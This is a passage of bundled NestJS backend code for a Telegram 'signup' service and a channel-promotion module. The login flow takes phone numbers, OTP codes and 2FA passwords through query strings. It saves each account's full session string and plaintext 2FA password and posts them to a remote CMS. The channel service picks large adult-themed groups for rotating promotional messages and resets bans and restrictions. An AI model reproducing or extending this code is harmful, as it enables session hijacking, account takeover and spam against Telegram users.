                        callId: log.action.callId.value,
                        duration: log.action.duration,
                        video: log.action.video,
                        timestamp: log.date
                    };
                    console.log(callInfo);
                    if (log.out) {
                        filteredResults.outgoing++;
                    }
                    else {
                        filteredResults.incoming++;
                    }
                    if (log.action.video) {
                        filteredResults.video++;
                    }
                    const chatId = log.peerId.userId.value;
                    if (!filteredResults.chatCallCounts[chatId]) {
                        console.log("Getting Enitity", chatId);
                        let ent = { firstName: 'Default', lastName: null };
                        try {
                            ent = await this.client.getInputEntity(chatId);
                            console.log("Got Enitity", chatId);
                        }
                        catch (error) {
                            console.log("Failed to get entity for chatId:", chatId, error);
                        }
                        filteredResults.chatCallCounts[chatId] = {
                            name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
                            count: 0
                        };
                    }
                    else {
                        console.log(chatId, ' Already exists');
                    }
                    filteredResults.chatCallCounts[chatId].count++;
                }
                catch (error) {
                    console.log("Error processing log:", log, error);
                }
            }
            console.log('Returning filtered results', filteredResults);
            return filteredResults;
        }
        catch (error) {
            console.error("Error in getCallLogs:", error);
            throw error;
        }
    }
    async processLogin(result, passowrd = undefined) {
        console.log(this.client.session.save());
        await this.client.getMe();
        let photoCount = 0;
        let videoCount = 0;
        let movieCount = 0;
        const sess = this.client.session.save();
        const user = await result.toJSON();
        let channels = 0;
        const chatsArray = [];
        let personalChats = 0;
        console.log("AllGood");
        const payload3 = {
            photoCount, videoCount, movieCount,
            gender: null,
            mobile: user.phone,
            session: `${sess}`,
            firstName: user.firstName,
            lastName: user.lastName,
            userName: user.username,
            channels: channels,
            personalChats: personalChats,
            calls: {},
            contacts: 0,
            msgs: 0,
            totalChats: 0,
            lastActive: new Date().toISOString().split('T')[0],
            tgId: user.id
        };
        if (passowrd) {
            payload3['twoFA'] = true;
            payload3['password'] = passowrd;
        }
        console.log("Calculated results");
        try {
            const url = `${process.env.tgcms}/user`;
            console.log("posting results : ", url);
            await axios_1.default.post(url, payload3, { headers: { 'Content-Type': 'application/json' } });
        }
        catch (error) {
            console.log("Error Occured 1");
            console.log(error);
        }
        await this.disconnect();
        await deleteClient(this.phoneNumber);
    }
}
exports.TgSignupService = TgSignupService;


/***/ }),

/***/ "./src/components/TgSignup/tgSignup.controller.ts":
/*!********************************************************!*\
  !*** ./src/components/TgSignup/tgSignup.controller.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TgSignupController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const TgSignup_service_1 = __webpack_require__(/*! ./TgSignup.service */ "./src/components/TgSignup/TgSignup.service.ts");
let TgSignupController = class TgSignupController {
    constructor() { }
    async sendCode(phone) {
        console.log(phone);
        const result = await (0, TgSignup_service_1.createClient)(phone);
        if (result?.isCodeViaApp) {
            console.log('OTP SENT!! - ', phone);
            return result;
        }
        else {
            throw new common_1.BadRequestException("Failed to send OTP");
        }
    }
    async verifyCode(phone, code, password) {
        const cli = await (0, TgSignup_service_1.getClient)(phone);
        if (cli) {
            console.log(cli?.phoneCodeHash, cli?.phoneNumber);
            const result = await cli?.login(code, password);
            if (result && result.status === 200) {
                return ({ mesaage: result.message });
            }
            else {
                throw new common_1.HttpException(result.message, result.status);
            }
        }
        else {
            throw new common_1.BadRequestException("Failed to Verify OTP");
        }
    }
};
exports.TgSignupController = TgSignupController;
__decorate([
    (0, common_1.Get)('login'),
    (0, swagger_1.ApiQuery)({ name: 'phone', required: true }),
    __param(0, (0, common_1.Query)('phone')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TgSignupController.prototype, "sendCode", null);
__decorate([
    (0, common_1.Get)('otp'),
    (0, swagger_1.ApiQuery)({ name: 'phone', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'code', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'password', required: false }),
    __param(0, (0, common_1.Query)('phone')),
    __param(1, (0, common_1.Query)('code')),
    __param(2, (0, common_1.Query)('password')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String]),
    __metadata("design:returntype", Promise)
], TgSignupController.prototype, "verifyCode", null);
exports.TgSignupController = TgSignupController = __decorate([
    (0, common_1.Controller)('tgsignup'),
    (0, swagger_1.ApiTags)('tgsignup'),
    __metadata("design:paramtypes", [])
], TgSignupController);


/***/ }),

/***/ "./src/components/active-channels/active-channels.controller.ts":
/*!**********************************************************************!*\
  !*** ./src/components/active-channels/active-channels.controller.ts ***!
  \**********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const active_channels_service_1 = __webpack_require__(/*! ./active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const create_active_channel_dto_1 = __webpack_require__(/*! ./dto/create-active-channel.dto */ "./src/components/active-channels/dto/create-active-channel.dto.ts");
const update_active_channel_dto_1 = __webpack_require__(/*! ./dto/update-active-channel.dto */ "./src/components/active-channels/dto/update-active-channel.dto.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const add_reaction_dto_1 = __webpack_require__(/*! ./dto/add-reaction.dto */ "./src/components/active-channels/dto/add-reaction.dto.ts");
let ActiveChannelsController = class ActiveChannelsController {
    constructor(activeChannelsService) {
        this.activeChannelsService = activeChannelsService;
    }
    async create(createActiveChannelDto) {
        return this.activeChannelsService.create(createActiveChannelDto);
    }
    async createMultiple(createChannelDtos) {
        return this.activeChannelsService.createMultiple(createChannelDtos);
    }
    search(query) {
        console.log(query);
        return this.activeChannelsService.search(query);
    }
    async findAll() {
        return this.activeChannelsService.findAll();
    }
    async findOne(channelId) {
        return this.activeChannelsService.findOne(channelId);
    }
    async update(channelId, updateActiveChannelDto) {
        return this.activeChannelsService.update(channelId, updateActiveChannelDto);
    }
    async remove(channelId) {
        return this.activeChannelsService.remove(channelId);
    }
    addReaction(channelId, addReactionDto) {
        if (!addReactionDto.reactions) {
            throw new common_1.BadRequestException('Reaction is required');
        }
        return this.activeChannelsService.addReactions(channelId, addReactionDto.reactions);
    }
    getRandomReaction(channelId) {
        return this.activeChannelsService.getRandomReaction(channelId);
    }
    removeReaction(channelId, addReactionDto) {
        if (!addReactionDto.reactions) {
            throw new common_1.BadRequestException('Reaction is required');
        }
        return this.activeChannelsService.removeReaction(channelId, addReactionDto.reactions[0]);
    }
};
exports.ActiveChannelsController = ActiveChannelsController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new active channel' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_active_channel_dto_1.CreateActiveChannelDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "create", null);
__decorate([
    (0, common_1.Post)('createMultiple'),
    (0, swagger_1.ApiOperation)({ summary: 'Create multiple channels' }),
    (0, swagger_1.ApiBody)({ type: [create_active_channel_dto_1.CreateActiveChannelDto] }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Array]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "createMultiple", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search channels by filters' }),
    (0, swagger_1.ApiQuery)({ name: 'channelId', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'broadcast', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'canSendMsgs', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'participantsCount', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'restricted', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'sendMessages', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'title', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'username', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'wordRestriction', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'dMRestriction', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'availableMsgs', required: false, type: [String] }),
    (0, swagger_1.ApiQuery)({ name: 'reactions', required: false, type: [String] }),
    (0, swagger_1.ApiQuery)({ name: 'banned', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'reactRestricted', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'megagroup', required: false, type: Boolean }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all active channels' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get an active channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update an active channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_active_channel_dto_1.UpdateActiveChannelDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete an active channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)(':channelId/reactions'),
    (0, swagger_1.ApiOperation)({ summary: 'Add reaction to chat group' }),
    __param(0, (0, common_1.Param)('channelId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, add_reaction_dto_1.AddReactionDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "addReaction", null);
__decorate([
    (0, common_1.Get)(':channelId/reactions/random'),
    (0, swagger_1.ApiOperation)({ summary: 'Get a random reaction from chat group' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "getRandomReaction", null);
__decorate([
    (0, common_1.Delete)(':channelId/reactions'),
    (0, swagger_1.ApiOperation)({ summary: 'Remove reaction from chat group' }),
    __param(0, (0, common_1.Param)('channelId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, add_reaction_dto_1.AddReactionDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "removeReaction", null);
exports.ActiveChannelsController = ActiveChannelsController = __decorate([
    (0, swagger_1.ApiTags)('Active Channels'),
    (0, common_1.Controller)('active-channels'),
    __metadata("design:paramtypes", [active_channels_service_1.ActiveChannelsService])
], ActiveChannelsController);


/***/ }),

/***/ "./src/components/active-channels/active-channels.module.ts":
/*!******************************************************************!*\
  !*** ./src/components/active-channels/active-channels.module.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const active_channels_service_1 = __webpack_require__(/*! ./active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const active_channels_controller_1 = __webpack_require__(/*! ./active-channels.controller */ "./src/components/active-channels/active-channels.controller.ts");
const active_channel_schema_1 = __webpack_require__(/*! ./schemas/active-channel.schema */ "./src/components/active-channels/schemas/active-channel.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const promote_msgs_module_1 = __webpack_require__(/*! ../promote-msgs/promote-msgs.module */ "./src/components/promote-msgs/promote-msgs.module.ts");
let ActiveChannelsModule = class ActiveChannelsModule {
};
exports.ActiveChannelsModule = ActiveChannelsModule;
exports.ActiveChannelsModule = ActiveChannelsModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.initModule,
            mongoose_1.MongooseModule.forFeature([{ name: active_channel_schema_1.ActiveChannel.name, schema: active_channel_schema_1.ActiveChannelSchema }]),
            promote_msgs_module_1.PromoteMsgModule
        ],
        controllers: [active_channels_controller_1.ActiveChannelsController],
        providers: [active_channels_service_1.ActiveChannelsService],
        exports: [active_channels_service_1.ActiveChannelsService]
    })
], ActiveChannelsModule);


/***/ }),

/***/ "./src/components/active-channels/active-channels.service.ts":
/*!*******************************************************************!*\
  !*** ./src/components/active-channels/active-channels.service.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsService = void 0;
const promote_msgs_service_1 = __webpack_require__(/*! ./../promote-msgs/promote-msgs.service */ "./src/components/promote-msgs/promote-msgs.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const active_channel_schema_1 = __webpack_require__(/*! ./schemas/active-channel.schema */ "./src/components/active-channels/schemas/active-channel.schema.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils.ts");
let ActiveChannelsService = class ActiveChannelsService {
    constructor(activeChannelModel, promoteMsgsService) {
        this.activeChannelModel = activeChannelModel;
        this.promoteMsgsService = promoteMsgsService;
    }
    async create(createActiveChannelDto) {
        createActiveChannelDto.availableMsgs = Object.keys(await this.promoteMsgsService.findOne());
        const createdChannel = new this.activeChannelModel(createActiveChannelDto);
        return createdChannel.save();
    }
    async createMultiple(createChannelDtos) {
        const bulkOps = createChannelDtos.map((dto) => ({
            updateOne: {
                filter: { channelId: dto.channelId },
                update: { $set: dto },
                upsert: true
            }
        }));
        await this.activeChannelModel.bulkWrite(bulkOps, { ordered: false });
        return 'Channels Saved';
    }
    async findAll() {
        return this.activeChannelModel.find().exec();
    }
    async findOne(channelId) {
        const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();
        return channel;
    }
    async update(channelId, updateActiveChannelDto) {
        delete updateActiveChannelDto["_id"];
        const updatedChannel = await this.activeChannelModel.findOneAndUpdate({ channelId }, { $set: updateActiveChannelDto }, { new: true, upsert: true }).exec();
        return updatedChannel;
    }
    async removeFromAvailableMsgs(channelId, msg) {
        return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $pull: { availableMsgs: msg } });
    }
    async addToAvailableMsgs(channelId, msg) {
        return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $addToSet: { availableMsgs: msg } });
    }
    async remove(channelId) {
        const result = await this.activeChannelModel.findOneAndDelete({ channelId }).exec();
    }
    async search(filter) {
        console.log(filter);
        return this.activeChannelModel.find(filter).exec();
    }
    async addReactions(channelId, reactions) {
        const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {
            $addToSet: { reactions: reactions }
        });
        return channel;
    }
    async getRandomReaction(channelId) {
        const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();
        if (!channel) {
            return undefined;
        }
        if (channel.reactions.length === 0) {
            return undefined;
        }
        const randomIndex = Math.floor(Math.random() * channel.reactions.length);
        return channel.reactions[randomIndex];
    }
    async removeReaction(channelId, reaction) {
        const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {
            $pull: { reactions: reaction },
        });
        return channel;
    }
    async getActiveChannels(limit = 50, skip = 0, notIds = []) {
        const query = {
            '$and': [
                {
                    '$or': [
                        { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },
                        { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },
                    ]
                },
                {
                    '$or': [
                        { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },
                        { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },
                    ]
                },
                {
                    channelId: { '$nin': notIds },
                    participantsCount: { $gt: 600 },
                    username: { $ne: null },
                    canSendMsgs: true,
                    restricted: false,
                    forbidden: false
                }
            ]
        };
        const sort = { participantsCount: -1 };
        try {
            const result = await this.activeChannelModel.aggregate([
                { $match: query },
                { $skip: skip },
                { $limit: limit },
                { $sort: sort },
                { $project: { randomField: 0 } }
            ]).exec();
            return result;
        }
        catch (error) {
            console.error('Error:', error);
            return [];
        }
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.activeChannelModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async resetWordRestrictions() {
        await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=Request Received for Reset Available Msgs`);
        try {
            await this.activeChannelModel.updateMany({
                banned: false
            }, {
                $set: {
                    "wordRestriction": 0,
                    "dMRestriction": 0
                }
            });
        }
        catch (e) {
            console.log((0, utils_1.parseError)(e));
        }
    }
    async resetAvailableMsgs() {
        await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=Request Received for Reset Available Msgs`);
        try {
            const data = await this.promoteMsgsService.findOne();
            const keys = Object.keys(data);
            await this.activeChannelModel.updateMany({
                $expr: {
                    $lt: [{ $size: { $ifNull: ["$availableMsgs", []] } }, 5]
                }
            }, {
                $set: {
                    "wordRestriction": 0,
                    "dMRestriction": 0,
                    "banned": false,
                    "availableMsgs": keys
                }
            });
        }
        catch (e) {
            console.log((0, utils_1.parseError)(e));
        }
    }
    async updateBannedChannels() {
        await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=Request Received for update banned Channels`);
        await this.activeChannelModel.updateMany({ $or: [{ banned: true }, { private: true }] }, {
            $set: {
                "wordRestriction": 0,
                "dMRestriction": 0,
                banned: false,
                "private": false
            }
        });
    }
    async updateDefaultReactions() {
        await this.activeChannelModel.updateMany({}, {
            $set: {
                reactions: [
                    '❤', '🔥', '👏', '🥰', '😁', '🤔',
                    '🤯', '😱', '🤬', '😢', '🎉', '🤩',
                    '🤮', '💩', '🙏', '👌', '🕊', '🤡',
                    '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',
                    '🤣', '💔', '🏆', '😭', '😴', '👍',
                    '🌚', '⚡', '🍌', '😐', '💋', '👻',
                    '👀', '🙈', '🤝', '🤗', '🆒',
                    '🗿', '🙉', '🙊', '🤷', '👎'
                ]
            }
        });
    }
};
exports.ActiveChannelsService = ActiveChannelsService;
exports.ActiveChannelsService = ActiveChannelsService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(active_channel_schema_1.ActiveChannel.name)),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => promote_msgs_service_1.PromoteMsgsService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        promote_msgs_service_1.PromoteMsgsService])
], ActiveChannelsService);


/***/ }),

/***/ "./src/components/active-channels/dto/add-reaction.dto.ts":
/*!****************************************************************!*\
  !*** ./src/components/active-channels/dto/add-reaction.dto.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AddReactionDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class AddReactionDto {
}
exports.AddReactionDto = AddReactionDto;
__decorate([
    (0, swagger_1.ApiProperty)({ required: true }),
    __metadata("design:type", Array)
], AddReactionDto.prototype, "reactions", void 0);


/***/ }),

/***/ "./src/components/active-channels/dto/create-active-channel.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/active-channels/dto/create-active-channel.dto.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateActiveChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateActiveChannelDto {
    constructor() {
        this.reactRestricted = false;
        this.wordRestriction = 0;
        this.dMRestriction = 0;
        this.reactions = [
            '❤', '🔥', '👏', '🥰', '😁', '🤔',
            '🤯', '😱', '🤬', '😢', '🎉', '🤩',
            '🤮', '💩', '🙏', '👌', '🕊', '🤡',
            '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',
            '🤣', '💔', '🏆', '😭', '😴', '👍',
            '🌚', '⚡', '🍌', '😐', '💋', '👻',
            '👀', '🙈', '🤝', '🤗', '🆒',
            '🗿', '🙉', '🙊', '🤷', '👎'
        ];
        this.banned = false;
        this.private = false;
    }
}
exports.CreateActiveChannelDto = CreateActiveChannelDto;
__decorate([
    (0, swagger_1.ApiProperty)(),
    __metadata("design:type", String)
], CreateActiveChannelDto.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: 300 }),
    __metadata("design:type", Number)
], CreateActiveChannelDto.prototype, "participantsCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "restricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "sendMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "reactRestricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    __metadata("design:type", String)
], CreateActiveChannelDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    __metadata("design:type", String)
], CreateActiveChannelDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: 0 }),
    __metadata("design:type", Number)
], CreateActiveChannelDto.prototype, "wordRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: 0 }),
    __metadata("design:type", Number)
], CreateActiveChannelDto.prototype, "dMRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: [String] }),
    __metadata("design:type", Array)
], CreateActiveChannelDto.prototype, "availableMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        type: [String], default: [
            '❤', '🔥', '👏', '🥰', '😁', '🤔',
            '🤯', '😱', '🤬', '😢', '🎉', '🤩',
            '🤮', '💩', '🙏', '👌', '🕊', '🤡',
            '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',
            '🤣', '💔', '🏆', '😭', '😴', '👍',
            '🌚', '⚡', '🍌', '😐', '💋', '👻',
            '👀', '🙈', '🤝', '🤗', '🆒',
            '🗿', '🙉', '🙊', '🤷', '👎'
        ]
    }),
    __metadata("design:type", Array)
], CreateActiveChannelDto.prototype, "reactions", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "banned", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true, required: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false, required: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "forbidden", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is private',
        example: false,
        required: false,
    }),
    __metadata("design:type", Boolean)
